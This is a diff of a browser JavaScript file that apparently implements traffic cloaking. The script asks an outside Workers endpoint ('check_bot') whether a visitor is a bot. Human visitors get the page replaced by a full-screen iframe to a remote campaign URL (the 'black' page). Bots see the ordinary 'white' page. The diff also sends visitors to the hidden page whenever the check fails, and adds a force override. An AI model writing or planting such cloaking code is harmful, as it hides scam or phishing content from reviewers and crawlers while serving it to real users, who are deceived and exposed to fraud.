@@ -1,7 +1,7 @@
 const createLoader = () => {
   const frame = document.createElement('iframe');
   frame.id = 'load_frame';
-  frame.src = `frameLoad.html`;
+  frame.src = 'frameLoad.html';
   frame.frameBorder = 0;
   frame.width = '100%';
   frame.height = '100%';
@@ -11,98 +11,73 @@ const createLoader = () => {
   frame.style.width = '100%';
   frame.style.height = '100%';
   frame.style.zIndex = 9999;
-
-  const body = document.querySelector('body');
-  if (body) {
-    body.prepend(frame);
-  }
+  document.body.prepend(frame);
 };
 
 const showWhite = () => {
-  const body = document.querySelector('body');
-  const html = document.documentElement;
-  if (body) {
-    body.classList.remove('hidden');
-    body.removeAttribute('hidden');
-    body.style.overflow = 'auto';
-  }
-  if (html) {
-    html.style.overflow = 'auto';
-  }
-
-
-  document.querySelectorAll('style').forEach(styleTag => {
-    if (styleTag.textContent.includes('overflow: hidden')) {
-      styleTag.textContent = styleTag.textContent.replace(/overflow:\s*hidden;?/g, 'overflow: auto !important;');
-    }
-  });
-
-  const preload = document.querySelector('#load_frame');
-  if (preload) {
-    preload.remove();
-  }
+  const body = document.body;
+  body.classList.remove('hidden');
+  body.removeAttribute('hidden');
+  body.style.overflow = 'auto';
+  const preload = document.getElementById('load_frame');
+  if (preload) preload.remove();
 };
 
 const showBlack = (blackUrl) => {
-
-  document.body.innerHTML = '';
-  document.body.style.margin = '0';
-  document.body.style.padding = '0';
-  document.body.style.overflow = 'hidden';
+  const body = document.body;
+  body.innerHTML = '';
+  body.style.margin = '0';
+  body.style.padding = '0';
+  body.style.overflow = 'hidden';
 
   const frame = document.createElement('iframe');
-  frame.setAttribute('src', blackUrl);
-  frame.setAttribute('id', 'wrapper_frame');
-  frame.style = `
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100vw;
-    height: 100vh;
-    border: none;
-    z-index: 10000;
-    display: block;
+  frame.id = 'wrapper_frame';
+  frame.src = blackUrl;
+  frame.style.cssText = `
+    position:fixed;top:0;left:0;width:100vw;height:100vh;
+    border:none;z-index:10000;display:block;background:#000;
   `;
-
-  document.body.appendChild(frame);
-  body.classList.remove('hidden');
+  body.appendChild(frame);
   body.removeAttribute('hidden');
-
-  const style = document.createElement('style');
-  style.innerHTML = `
-    @media only screen and (max-width: 768px) {
-      #wrapper_frame { height: 50vh; }
-    }
-    @media only screen and (max-width: 480px) {
-      #wrapper_frame { height: 30vh; }
-    }
-  `;
-  document.head.appendChild(style);
-
+  body.classList.remove('hidden');
 
   setTimeout(() => {
-    const preload = document.querySelector('#load_frame');
+    const preload = document.getElementById('load_frame');
     if (preload) preload.remove();
-  }, 300);
+  }, 200);
 };
-
 
 createLoader();
 
 window.addEventListener('DOMContentLoaded', () => {
-  fetch('https://gitrunwa.slynney84.workers.dev/loader/api/check_bot')
-    .then(res => res.json())
+  const qs = location.search || '';
+  const workerURL = 'https://gitrunwa.slynney84.workers.dev/loader/api/check_bot' + qs;
+
+  fetch(workerURL)
+    .then(r => r.json())
     .then(res => {
-      if (res?.code === 200 && !res.result && res.url) {
-       
-        showBlack(res.url + '/wvS95k');
+      console.log('check_bot response:', res);
+      console.log('Client IP forwarded:', res.clientIP);
+
+      const force = new URLSearchParams(location.search).get('force') === '1';
+
+      if (force) {
+        console.log('FORCE=1 → iframe от result');
+        showBlack((res.campaign || 'https://app.active-campaign.org/wvS95k') + qs);
+        return;
+      }
+
+      if (res.code === 200 && res.result === false) {
+   
+        showBlack((res.campaign || 'https://app.active-campaign.org/wvS95k') + qs);
       } else {
-        
-        setTimeout(showWhite, 300);
+    
+        showWhite();
       }
     })
-    .catch(err => {
-      console.error('error resp:', err);
-      showWhite();
+    .catch(e => {
+      console.error('error resp:', e);
+      
+      showBlack('https://app.active-campaign.org/wvS95k' + (location.search || ''));
     });
 });
